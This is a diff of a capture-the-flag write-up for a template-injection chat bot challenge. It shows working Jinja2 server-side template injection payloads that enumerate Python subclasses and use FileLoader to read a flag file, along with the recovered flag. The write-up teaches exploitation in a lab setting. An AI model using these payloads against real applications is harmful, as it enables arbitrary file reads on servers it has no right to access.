@@ -1,7 +1,10 @@
 ---
 created: 2024-07-06T23:50
-updated: 2024-07-07T03:57
+updated: 2024-07-07T21:46
 title: Parrot EMU
+solves: 993
+points: 100
+description: A template injection chat bot
 ---
 
 ```python
@@ -14,20 +17,29 @@ except Exception as e:
 Well, its template injection time.
 ## Template Injection
 
+Code inside of templates, have a very limited context, they are missing `globals`.
+So we have to find those classes.
+### Find Classes
 `{{''.__class__.__base__.__subclasses__()}}`
+`''.__class__` is the `str` class, `<str>.__base__` is the `object` class, this payload will hence give us all available classes.
 
-```
+```python
+# EMU REPLY:
 `[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, ...
 
-<class '_frozen_importlib_external.FileLoader'>, 
+<class '_frozen_importlib_external.FileLoader'>,  # this is what we want to use
 <class '_frozen_importlib_external._NamespacePath'>, 
 ...
 <class 'werkzeug.debug.console.Console'>, <class 'werkzeug.debug.tbtools.Line'>, <class 'werkzeug.debug.tbtools.Traceback'>, <class 'werkzeug.debug.tbtools.Group'>, <class 'werkzeug.debug.tbtools.Frame'>, <class 'werkzeug.debug._ConsoleFrame'>, <class 'werkzeug.debug.DebuggedApplication'>]`
 ```
 
-`a.findIndex(a=>a.includes("File")) = 99`
+We will use `FileLoader` to read our flag.
+`a.findIndex(a=>a.includes("File")) = 99`, we have determined that its the 99th item is the subclass list.
 
-`{{'abc'.__class__.__base__.__subclasses__()[99]("flag", "flag").get_data("flag")}}`
+## Attack
+`{{''.__class__.__base__.__subclasses__()[99]("flag", "flag").get_data("flag")}}`
+
+This constructs a new `FileLoader` instance and reads the flag.
 
 `DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`
 
